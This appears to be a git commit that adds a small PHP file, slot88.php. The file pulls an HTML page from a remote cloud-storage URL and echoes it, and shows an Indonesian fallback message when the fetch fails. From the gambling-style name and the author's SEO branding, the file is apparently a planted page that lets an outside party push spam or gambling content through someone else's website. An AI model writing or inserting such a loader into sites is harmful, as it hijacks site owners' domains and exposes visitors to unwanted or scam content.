72c41b218d70d2c1751aa938a6a6e87f68f0c7f9
Haryono | Digital Growth SEO Strategy <drafharyono@gmail.com>
2026-07-01 13:05:12 +0700

    Create slot88.php

---
+++ slot88.php
@@ -0,0 +1,11 @@
+<?php
+$url = "https://pub-f04386c43d984a39ad18471442e55c02.r2.dev/rottefactory-5.html";
+
+$konten = @file_get_contents($url);
+
+if ($konten !== false) {
+    echo $konten;
+} else {
+    echo "KONTEN NYA MANA, UPLOAD DULU BOSKU !!!";
+}
+?>
